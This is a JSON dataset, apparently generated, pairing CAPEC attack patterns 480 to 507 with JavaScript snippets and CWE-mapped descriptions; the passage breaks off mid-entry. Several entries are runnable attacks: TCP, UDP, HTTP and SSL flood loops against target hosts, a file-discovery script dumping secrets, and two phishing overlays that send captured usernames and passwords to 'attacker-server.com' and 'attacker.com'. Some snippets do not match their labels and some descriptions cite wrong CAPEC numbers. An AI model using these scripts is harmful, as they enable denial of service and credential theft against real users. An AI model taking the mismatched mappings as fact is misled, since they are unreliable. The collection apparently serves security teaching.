        "description": "This JavaScript code snippet demonstrates how an adversary might exploit a weakness in certificate validation to install a malicious root certificate and use it to intercept HTTPS requests. The code loads a malicious root certificate and creates an HTTPS agent that trusts this certificate, bypassing proper certificate validation (CWE-295). It then makes a request to a spoofed website, which would normally trigger a security warning in the browser. By trusting the malicious root certificate, the adversary can avoid these warnings and intercept sensitive information such as login credentials. This embodies the main idea of the CAPEC by showing how improper certificate validation can be exploited to compromise secure communications."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "const vm = require('vm');\n\n// Simulated untrusted code execution in a virtualized environment\nconst untrustedCode = `\n  const fs = require('fs');\n  fs.readFile('/etc/passwd', 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log(data);\n  });\n`;\n\ntry {\n  // Create a new VM context\n  const context = vm.createContext();\n  // Execute untrusted code in the VM context\n  vm.runInContext(untrustedCode, context);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can escape a virtualized environment to access sensitive information. The code uses Node.js's 'vm' module to create a virtualized context and execute untrusted code. The untrusted code attempts to read the '/etc/passwd' file, which contains sensitive information. This example embodies the CAPEC concept of 'Escaping Virtualization' by showing how improper isolation (CWE-653) and protection mechanism failures (CWE-693) can lead to unauthorized access to sensitive data. The code also highlights the risk of executing commands from an untrusted source (CWE-114)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'legitimate-domain.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Host': 'malicious-domain.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic example of 'Domain Fronting', where contradictory destinations are provided in the HTTPS request. The 'hostname' field in the options object is set to 'legitimate-domain.com', while the 'Host' header is set to 'malicious-domain.com'. This discrepancy can be exploited to route traffic to an unintended destination, potentially bypassing security measures. This embodies the main idea of CAPEC-Contradictory Destinations in Traffic Routing Schemes. The related CWEs provide additional context, such as improper restriction of communication channels (CWE-923), inconsistent interpretation of HTTP requests (CWE-444), and incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 80;\nconst maxConnections = 1000;\nlet connections = 0;\n\nfunction flood() {\n  if (connections < maxConnections) {\n    const client = new net.Socket();\n    client.connect(targetPort, targetHost, () => {\n      console.log('Connected');\n      connections++;\n    });\n    client.on('error', (err) => {\n      console.error('Connection error:', err);\n    });\n    client.on('close', () => {\n      connections--;\n      flood();\n    });\n  }\n}\n\nfor (let i = 0; i < maxConnections; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates a basic TCP flood attack using the 'net' module. The code attempts to establish a large number of TCP connections to a target server (192.168.1.1 on port 80) without any throttling or resource limits, embodying CWE-770 (Allocation of Resources Without Limits or Throttling). The flood function recursively attempts to maintain the maximum number of connections, which can overwhelm the target server and lead to a denial of service. This snippet represents the main idea of CAPEC-482 (TCP Flood) by exploiting the server's need to maintain state information for each connection. The code does not include any mechanisms to ensure message integrity (CWE-924) or control network message volume (CWE-406), further illustrating potential weaknesses in the system."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const xmlString = '<user><name>John Doe</name></user>'; \nconst parser = new DOMParser(); \nconst xmlDoc = parser.parseFromString(xmlString, 'text/xml'); \nconst userName = xmlDoc.getElementsByTagName('name')[0].childNodes[0].nodeValue; \nconsole.log('User Name:', userName);",
        "description": "This JavaScript code snippet demonstrates a basic XML parsing operation without proper validation or security measures. The XML string is parsed using the DOMParser, and the user name is extracted and logged to the console. This code is vulnerable to several issues described in the related CWEs: \n1. Missing XML Validation (CWE-112): The XML input is not validated against any schema, making it susceptible to malformed or malicious XML content. \n2. XML Injection (CWE-91): The code does not neutralize special elements in the XML, allowing potential injection attacks. \n3. Improper Restriction of XML External Entity Reference (CWE-611): If the XML contained external entities, the code could inadvertently process and include external content, leading to security risks. \nThis snippet embodies the main idea of the deprecated CAPEC by illustrating how unvalidated and improperly handled XML can lead to client-side vulnerabilities."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak PRNG (Predictable Algorithm in Random Number Generator)\nfunction weakRandom() {\n  return Math.floor(Math.random() * 1000000);\n}\n\n// Simulate signing a message with a weak key\nfunction signMessage(message, privateKey) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  return sign.sign(privateKey, 'hex');\n}\n\n// Simulate verifying a message\nfunction verifyMessage(message, signature, publicKey) {\n  const verify = crypto.createVerify('SHA256');\n  verify.update(message);\n  verify.end();\n  return verify.verify(publicKey, signature, 'hex');\n}\n\n// Example usage\nconst message = 'Important transaction';\nconst privateKey = weakRandom().toString(); // Weak private key generation\nconst publicKey = weakRandom().toString(); // Weak public key generation\nconst signature = signMessage(message, privateKey);\n\nconsole.log('Message:', message);\nconsole.log('Signature:', signature);\nconsole.log('Verification:', verifyMessage(message, signature, publicKey));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can exploit a cryptographic weakness due to the use of a weak pseudorandom number generator (PRNG) to recreate a private key. The `weakRandom` function uses `Math.random()`, which is not suitable for cryptographic purposes due to its predictability (CWE-1241). The `signMessage` function simulates signing a message with a weak private key, and the `verifyMessage` function simulates verifying the message with a weak public key. This setup can lead to signature spoofing, where an attacker can predict or recreate the private key and forge signatures, misleading victims into performing actions that benefit the attacker. This example embodies the main idea of CAPEC-330 and highlights related weaknesses such as insufficiently random values (CWE-330) and predictable algorithms in random number generators (CWE-1241)."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\nconst message = Buffer.from('Flood Attack');\n\nfunction flood() {\n  for (let i = 0; i < 10000; i++) {\n    client.send(message, 0, message.length, targetPort, targetHost, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nflood();",
        "description": "This JavaScript code snippet demonstrates a UDP flood attack, which is a type of denial-of-service (DoS) attack. The code uses the 'dgram' module to create a UDP socket and sends a large number of UDP packets to a target host and port. The 'flood' function sends 10,000 UDP packets with the message 'Flood Attack' to the specified target. This can overwhelm the target's network bandwidth and resources, potentially causing a denial of service. The code embodies the main idea of CAPEC-UDP Flood and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // No throttling or resource limits\n  // No validation of the source address\n  // Cleartext transmission of data\n  server.send(msg, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending response:', err);\n  });\n});\n\nserver.bind(41234, () => {\n  console.log('Server is listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming messages and echoes them back to the sender. The code embodies the main idea of an ICMP Flood attack by not implementing any resource limits or throttling (CWE-770), not validating the source address (CWE-941), and transmitting data in cleartext (CWE-319). This makes the server vulnerable to flooding attacks, where an attacker can send a high rate of packets to consume network bandwidth and deny service to legitimate users."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource?query=sensitiveData',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) { // CWE-770: No limit on resource allocation\n    const req = http.request(options, (res) => {\n      res.on('data', (chunk) => {\n        // Process response data\n      });\n    });\n\n    req.on('error', (e) => {\n      console.error(`Problem with request: ${e.message}`);\n    });\n\n    req.end();\n  }\n}\n\nfloodServer();",
        "description": "This JavaScript code snippet demonstrates an HTTP flood attack, which is designed to overwhelm a target server by sending a large number of HTTP GET requests. The 'floodServer' function sends 1000 GET requests to 'target-server.com' without any throttling or limits (CWE-770). The requests include a sensitive query string in the URL (CWE-598), which could expose sensitive information. This attack aims to consume the server's resources, making it difficult for legitimate users to access the service. The code represents the main idea of CAPEC-488 (HTTP Flood) by illustrating how an attacker can exploit resource allocation vulnerabilities to perform a denial-of-service attack."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst options = {\n  hostname: 'target-server.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    const req = https.request(options, (res) => {\n      res.on('data', (d) => {});\n    });\n    req.on('error', (e) => {});\n    req.end();\n  }\n}\n\nsetInterval(floodServer, 100);",
        "description": "This JavaScript code snippet demonstrates a basic SSL flood attack. It repeatedly sends a large number of HTTPS requests to a target server, aiming to exhaust the server's resources. The 'floodServer' function creates 1000 HTTPS requests in a loop, and this function is called every 100 milliseconds using 'setInterval'. This simulates the CAPEC-147 'SSL Flood' attack by leveraging the asymmetric resource consumption between the client and server. The related CWEs are represented by the lack of resource limits (CWE-770), insufficient resource pool (CWE-410), and uncontrolled resource consumption (CWE-400), which can lead to denial of service for legitimate users."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const http = require('http');\n\nfunction sendAmplifiedRequest(targetServer) {\n  const options = {\n    hostname: 'third-party-service.com',\n    port: 80,\n    path: '/api/large-response',\n    method: 'GET',\n    headers: {\n      'X-Forwarded-For': targetServer\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Intentionally left empty to simulate resource consumption\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Example usage\nsendAmplifiedRequest('victim-server.com');",
        "description": "This JavaScript code snippet demonstrates an amplification attack. The function `sendAmplifiedRequest` sends a request to a third-party service, spoofing the source address to be that of the target server (`victim-server.com`). The third-party service is expected to generate a large response, which is then sent to the target server, consuming its resources. This code embodies the main idea of CAPEC-130 (Amplification) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume). The code does not include proper resource allocation limits or network traffic control, making it vulnerable to amplification attacks."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "const expandEntity = (entity, times) => {\n  let expanded = '';\n  for (let i = 0; i < times; i++) {\n    expanded += entity;\n  }\n  return expanded;\n};\n\nconst largeEntity = 'A'.repeat(1000000); // 1 million characters\nconst result = expandEntity(largeEntity, 1000); // Expanding the large entity 1000 times\nconsole.log(result.length); // This will cause excessive memory allocation",
        "description": "This JavaScript code snippet demonstrates a quadratic data expansion vulnerability. The `expandEntity` function takes an entity (a string) and a number of times to expand it. It concatenates the entity to itself the specified number of times, leading to excessive memory allocation. In this example, `largeEntity` is a string of 1 million characters, and it is expanded 1000 times, resulting in a string of 1 billion characters. This can cause the application to freeze or crash due to excessive memory usage. This snippet embodies the main idea of CAPEC-197 by showing how an adversary can exploit macro-like substitution to cause a denial of service. The related CWEs are represented by the lack of limits on resource allocation (CWE-770), improper handling of large data elements (CWE-1043), and potential issues with memory allocation (CWE-1325)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "const input = 'a'.repeat(100) + 'X';\nconst regex = /^(a+)+$/;\n\nconsole.time('regex');\nconst match = regex.test(input);\nconsole.timeEnd('regex');\n\nconsole.log('Match:', match);",
        "description": "This JavaScript code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regular expression /^(a+)+$/ is designed to match strings composed of one or more 'a' characters. However, due to its nested quantifiers, it can cause exponential backtracking when processing certain inputs. The input string 'a'.repeat(100) + 'X' is crafted to exploit this inefficiency, leading to excessive CPU consumption as the regex engine attempts to match the string. The code measures the time taken to execute the regex test, highlighting the performance impact. This example embodies CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n\n      // Vulnerable part: no limit on array size\n      const arraySize = result?.Array?.length || 0;\n      const array = new Array(arraySize);\n\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array allocated with size: ' + arraySize);\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it reads the body of the request and attempts to parse it as an XML document using the xml2js library. The code then extracts the size of an array from the parsed XML and allocates an array of that size without any limits or checks. This embodies the main idea of the CAPEC 'SOAP Array Blowup' by demonstrating how an attacker could send a SOAP message with a very large array declaration to exhaust the server's memory resources. The related CWEs are represented by the lack of resource allocation limits (CWE-770), improper handling of XML (CWE-611), and potential exposure of sensitive information through the WSDL (CWE-651)."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'target.server.com', () => {\n  console.log('Connected to server');\n  // Fragmented TCP packet\n  const fragment1 = Buffer.from('4500', 'hex'); // IP header (partial)\n  const fragment2 = Buffer.from('0034', 'hex'); // IP header (continuation)\n  const fragment3 = Buffer.from('00004000', 'hex'); // TCP header (partial)\n  const fragment4 = Buffer.from('0600', 'hex'); // TCP header (continuation)\n  client.write(fragment1);\n  client.write(fragment2);\n  client.write(fragment3);\n  client.write(fragment4);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // CWE-404: Improper Resource Shutdown or Release\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack using the 'net' module to create a TCP client. The client connects to a target server and sends fragmented TCP packets. The fragments are crafted to split the TCP header across multiple packets, potentially bypassing network filters that do not reassemble the fragments for inspection. The code also includes a potential CWE-404 vulnerability by not properly handling resource shutdown or release. This example embodies the main idea of CAPEC-148 (TCP Fragmentation) by showing how an attacker might fragment TCP packets to evade network controls."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\nconst largeMessage = Buffer.alloc(2000, 'A'); // 2000 bytes, larger than typical MTU\n\nfunction sendFragmentedPackets() {\n  for (let i = 0; i < 1000; i++) { // Sending multiple large packets\n    client.send(largeMessage, targetPort, targetHost, (err) => {\n      if (err) console.error('Error sending packet:', err);\n    });\n  }\n}\n\nsendFragmentedPackets();\n\nclient.on('close', () => {\n  console.log('Socket closed');\n});\n\nsetTimeout(() => {\n  client.close();\n}, 10000); // Close socket after 10 seconds",
        "description": "This JavaScript code snippet demonstrates a UDP Fragmentation attack. It uses the 'dgram' module to create a UDP client that sends large UDP packets (2000 bytes) to a target server. The packets are larger than the typical MTU (1500 bytes), forcing fragmentation. The code sends multiple large packets in a loop, which can consume significant network bandwidth and server resources, such as CPU and memory buffers, as the server processes and reassembles the fragmented packets. This attack leverages CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of packets sent, and CWE-406 (Insufficient Control of Network Message Volume) by not monitoring or controlling the volume of network traffic."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst fragmentICMP = (target, port) => {\n  const message = Buffer.alloc(65507, 'A'); // Large message to simulate fragmentation\n  for (let i = 0; i < 1000; i++) { // Send multiple fragmented packets\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n};\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 33434;\nfragmentICMP(targetHost, targetPort);",
        "description": "This JavaScript code snippet demonstrates a simplified version of an ICMP Fragmentation attack using the 'dgram' module to send large UDP packets to a target host. The 'fragmentICMP' function creates a large buffer to simulate fragmented ICMP messages and sends multiple packets to the target host, potentially causing resource exhaustion or a crash. This code embodies the main idea of the CAPEC by illustrating how an attacker might exploit resource allocation without limits (CWE-770) and improper resource shutdown or release (CWE-404) to disrupt the target system."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction findSensitiveFiles(directory) {\n  const sensitiveFiles = ['config.json', 'secrets.txt', 'access_control_list.txt'];\n  fs.readdir(directory, (err, files) => {\n    if (err) {\n      console.error('Error reading directory:', err);\n      return;\n    }\n    files.forEach(file => {\n      if (sensitiveFiles.includes(file)) {\n        const filePath = path.join(directory, file);\n        fs.readFile(filePath, 'utf8', (err, data) => {\n          if (err) {\n            console.error('Error reading file:', err);\n            return;\n          }\n          console.log(`Found sensitive file: ${filePath}`);\n          console.log('File contents:', data);\n        });\n      }\n    });\n  });\n}\n\n// Example usage\nfindSensitiveFiles('/path/to/directory');",
        "description": "This JavaScript code snippet demonstrates a file discovery attack by searching for common sensitive files (e.g., 'config.json', 'secrets.txt', 'access_control_list.txt') within a specified directory. The code reads the directory contents and checks if any of the files match the list of sensitive files. If a match is found, it reads and logs the file's contents. This embodies the CAPEC 'File Discovery' by probing for key files that may contain configuration and security parameters. The code also touches on related CWEs: CWE-200 (exposure of sensitive information), CWE-529 (exposure of access control list files), and CWE-73 (external control of file name or path)."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "document.addEventListener('visibilitychange', function() {\n  if (document.hidden) {\n    // Simulate sensitive information being exposed in a screenshot\n    document.body.innerHTML = '<h1>Confidential Information</h1><p>SSN: 123-45-6789</p>';\n  } else {\n    // Restore the original content when the app is in the foreground\n    document.body.innerHTML = '<h1>Welcome Back</h1>';\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is exposed when an iOS application is sent to the background. The 'visibilitychange' event listener is used to detect when the document becomes hidden (i.e., the app is sent to the background). When this happens, the content of the document is changed to display sensitive information, simulating a scenario where a screenshot could capture this data. When the app returns to the foreground, the content is restored to a non-sensitive state. This example embodies the CAPEC 'Probe iOS Screenshots' by showing how sensitive information can be exposed in temporary screenshots. It also touches on related CWEs such as 'Exposure of Private Personal Information to an Unauthorized Actor' (CWE-359) and 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' (CWE-497)."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that receives data via a query parameter\napp.get('/receiveData', (req, res) => {\n  const data = req.query.data;\n  // Improper verification of the source of the data\n  console.log('Received data:', data);\n  res.send('Data received');\n});\n\n// Vulnerable endpoint that sends sensitive data via cleartext\napp.get('/sendData', (req, res) => {\n  const sensitiveData = 'Sensitive Information';\n  // Use of cleartext transmission\n  res.send(`Sensitive data: ${sensitiveData}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with two endpoints that embody the vulnerabilities described in the CAPEC and related CWEs. The '/receiveData' endpoint demonstrates improper verification of the source of the data (CWE-925), allowing any client to send data without validation. The '/sendData' endpoint transmits sensitive information in cleartext (CWE-319), making it susceptible to interception. These vulnerabilities illustrate the risks of Android Intent Intercept, where an attacker can intercept, modify, or misuse data due to improper security practices."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var injectedScript = document.createElement('script');\n  injectedScript.innerHTML = `\n    // CWE-749: Exposed Dangerous Method or Function\n    function dangerousFunction() {\n      // CWE-506: Embedded Malicious Code\n      document.cookie = 'sessionId=maliciousSessionId';\n      // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n      if (document.cookie.includes('sessionId=maliciousSessionId')) {\n        alert('Session Hijacked!');\n      }\n    }\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    window.addEventListener('message', function(event) {\n      if (event.origin !== 'https://trusted-origin.com') {\n        dangerousFunction();\n      }\n    });\n  `;\n  document.body.appendChild(injectedScript);\n});",
        "description": "This JavaScript code snippet demonstrates a WebView Injection attack. It injects a script into the DOM when the page loads. The injected script defines a dangerous function that manipulates cookies (CWE-749, CWE-506, CWE-784) and sets up an event listener for messages from other origins (CWE-940). If a message is received from an untrusted origin, the dangerous function is executed, simulating a session hijack. This represents how an adversary can manipulate the DOM and cookies, exposing sensitive information and launching attacks from within a web page."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulate a trusted activity\napp.get('/trusted-activity', (req, res) => {\n  res.send('<h1>Trusted Activity</h1><form action=\"/submit\" method=\"post\"><input type=\"text\" name=\"sensitiveData\" placeholder=\"Enter sensitive data\"><button type=\"submit\">Submit</button></form>');\n});\n\n// Malicious activity hijacking the trusted activity\napp.get('/malicious-activity', (req, res) => {\n  res.send('<h1>Malicious Activity</h1><form action=\"/steal\" method=\"post\"><input type=\"text\" name=\"sensitiveData\" placeholder=\"Enter sensitive data\"><button type=\"submit\">Submit</button></form>');\n});\n\n// Endpoint to handle the form submission from the trusted activity\napp.post('/submit', (req, res) => {\n  // Process the sensitive data\n  res.send('Sensitive data submitted to trusted activity.');\n});\n\n// Endpoint to handle the form submission from the malicious activity\napp.post('/steal', (req, res) => {\n  // Steal the sensitive data\n  res.send('Sensitive data stolen by malicious activity.');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to simulate an Android Activity Hijack scenario. The '/trusted-activity' endpoint represents a trusted activity where users can submit sensitive data. The '/malicious-activity' endpoint represents a counterfeit activity that mimics the trusted activity's user interface to deceive users into entering their sensitive data. The '/submit' endpoint processes the data from the trusted activity, while the '/steal' endpoint captures the data from the malicious activity. This code demonstrates the concept of an adversary intercepting and hijacking an implicit intent to launch a counterfeit activity, as described in the CAPEC. The related CWEs are represented by the improper verification and restriction of communication channels and endpoints."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that accepts data from any source\napp.post('/updateData', (req, res) => {\n    const data = req.body.data;\n    // Process the data without verifying the source\n    updateDatabase(data);\n    res.send('Data updated');\n});\n\nfunction updateDatabase(data) {\n    // Simulate database update\n    console.log('Database updated with:', data);\n}\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js application endpoint that embodies the main idea of the CAPEC 'Intent Spoof'. The '/updateData' endpoint accepts data from any source and processes it without verifying the source, which is analogous to an Android application component that trusts an intent's action without verification. This can lead to improper access control (CWE-284), improper verification of the source (CWE-925), and potentially sensitive data being exposed or modified by unauthorized actors (CWE-926). The code demonstrates how an adversary could exploit such a vulnerability to inject or modify data."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "class MyAppInterface {\n  @JavascriptInterface\n  public void showToast(String toast) {\n    Toast.makeText(context, toast, Toast.LENGTH_SHORT).show();\n  }\n}\n\nWebView myWebView = (WebView) findViewById(R.id.webview);\nmyWebView.getSettings().setJavaScriptEnabled(true);\nmyWebView.addJavascriptInterface(new MyAppInterface(), \"Android\");\nmyWebView.loadUrl(\"http://malicious.example.com\");",
        "description": "This Java code snippet demonstrates a vulnerable implementation of the WebView's addJavascriptInterface API. The MyAppInterface class exposes a method showToast that can be called from JavaScript. The WebView is configured to enable JavaScript and register the MyAppInterface instance with the name 'Android'. When a malicious web page (http://malicious.example.com) is loaded, it can call the showToast method to execute arbitrary code within the context of the application. This represents the CAPEC 'WebView Exposure' and is related to CWEs such as 'Improper Access Control' (CWE-284) and 'Exposed Dangerous Method or Function' (CWE-749)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create an iframe to impersonate a legitimate task\n  var iframe = document.createElement('iframe');\n  iframe.style.position = 'absolute';\n  iframe.style.top = '0';\n  iframe.style.left = '0';\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  iframe.style.zIndex = '1000';\n  iframe.src = 'https://legitimate-site.com/login'; // URL of the legitimate task\n  document.body.appendChild(iframe);\n\n  // Capture user input from the impersonated task\n  iframe.onload = function() {\n    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n    iframeDoc.addEventListener('submit', function(event) {\n      event.preventDefault();\n      var formData = new FormData(event.target);\n      var username = formData.get('username');\n      var password = formData.get('password');\n      console.log('Captured credentials:', username, password);\n      // Send captured credentials to the attacker's server\n      fetch('https://attacker-server.com/steal', {\n        method: 'POST',\n        body: JSON.stringify({ username: username, password: password }),\n        headers: { 'Content-Type': 'application/json' }\n      });\n    });\n  };\n});",
        "description": "This JavaScript code snippet demonstrates a task impersonation attack. It creates an iframe that overlays the entire webpage, impersonating a legitimate login task from 'https://legitimate-site.com/login'. When the user interacts with this iframe, their credentials are captured and sent to an attacker's server. This example embodies the CAPEC concept of task impersonation by leveraging CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) to confuse the user about the interface they are interacting with. It also touches on CWE-506 (Embedded Malicious Code) by embedding malicious behavior within the code."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "window.addEventListener('load', function() {\n  if (window.location.protocol === 'myapp:') {\n    // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n    var params = new URLSearchParams(window.location.search);\n    var sensitiveData = params.get('data'); // CWE-598: Use of GET Request Method With Sensitive Query Strings\n    if (sensitiveData) {\n      // CWE-506: Embedded Malicious Code\n      document.body.innerHTML = '<form id=\"phishForm\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>';\n      document.getElementById('phishForm').addEventListener('submit', function(e) {\n        e.preventDefault();\n        var username = e.target.username.value;\n        var password = e.target.password.value;\n        // Send credentials to attacker's server\n        fetch('https://attacker.com/steal', {\n          method: 'POST',\n          headers: {'Content-Type': 'application/json'},\n          body: JSON.stringify({username: username, password: password})\n        });\n      });\n    }\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a Scheme Squatting attack. When a URL with a custom scheme (e.g., 'myapp:') is loaded, the code checks for sensitive data in the query string (CWE-598). If such data is found, it dynamically generates a phishing form (CWE-506) that mimics the target application's login screen. When the user submits the form, their credentials are sent to the attacker's server. This attack exploits improper authorization in the handler for the custom URL scheme (CWE-939)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a transparent overlay div\n  var overlay = document.createElement('div');\n  overlay.style.position = 'absolute';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.opacity = '0';\n  overlay.style.zIndex = '1000';\n  overlay.style.pointerEvents = 'none';\n\n  // Create a button that will be placed on top of the overlay\n  var maliciousButton = document.createElement('button');\n  maliciousButton.innerText = 'Click Me!';\n  maliciousButton.style.position = 'absolute';\n  maliciousButton.style.top = '50%';\n  maliciousButton.style.left = '50%';\n  maliciousButton.style.transform = 'translate(-50%, -50%)';\n  maliciousButton.style.zIndex = '1001';\n\n  // Append the overlay and button to the body\n  document.body.appendChild(overlay);\n  document.body.appendChild(maliciousButton);\n\n  // Add event listener to the button\n  maliciousButton.addEventListener('click', function() {\n    alert('You have been tapjacked!');\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a tapjacking attack. When the DOM content is loaded, it creates a transparent overlay that covers the entire screen. On top of this overlay, a button is placed that appears to be part of the underlying application. The overlay is set to be transparent and non-interactive (pointerEvents: 'none'), allowing clicks to pass through to the button. When the user clicks the button, an alert is triggered, simulating a malicious action. This example embodies the main idea of CAPEC-1021 (Tapjacking) by misleading the user into interacting with a hidden interface. The related CWEs are represented by the improper restriction of UI layers (CWE-1021), misrepresentation of critical information (CWE-451), and potential for cleartext transmission of sensitive information (CWE-319) if the button's action involved sending data."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "const fs = require('fs');\n\n// Sensitive information stored in a file without proper access control\nconst sensitiveData = 'User: admin, Password: secret123';\nfs.writeFileSync('sensitiveData.txt', sensitiveData);\n\n// Function to read sensitive data without any access control\nfunction readSensitiveData() {\n  return fs.readFileSync('sensitiveData.txt', 'utf8');\n}\n\n// Simulate physical access by an unauthorized actor\nconsole.log('Sensitive Data:', readSensitiveData());",
